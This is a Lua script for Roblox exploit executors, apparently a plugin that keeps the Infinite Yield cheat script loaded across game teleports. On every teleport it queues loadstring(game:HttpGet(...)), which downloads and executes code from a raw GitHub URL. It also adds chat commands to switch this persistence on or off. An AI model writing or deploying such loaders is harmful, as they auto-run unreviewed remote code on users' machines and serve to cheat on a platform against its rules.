if _G.loaded then
    return
end
_G.loaded = true 
queueteleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
local done = false
local on = true

Players.LocalPlayer.OnTeleport:Connect(function()
	if on and not done and queueteleport then
		done = true
		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Kggggg80/-/refs/heads/main/t'))()")
	end
end)

addcmd('keepiy', {}, function() on = true; notify('KeepIY', '已启用') end)
addcmd('unkeepiy', {}, function() on = false; notify('KeepIY', '已禁用') end)
addcmd('togglekeepiy', {}, function() on = not on; notify('KeepIY', on and '已启用' or '已禁用') end)
print("hello")
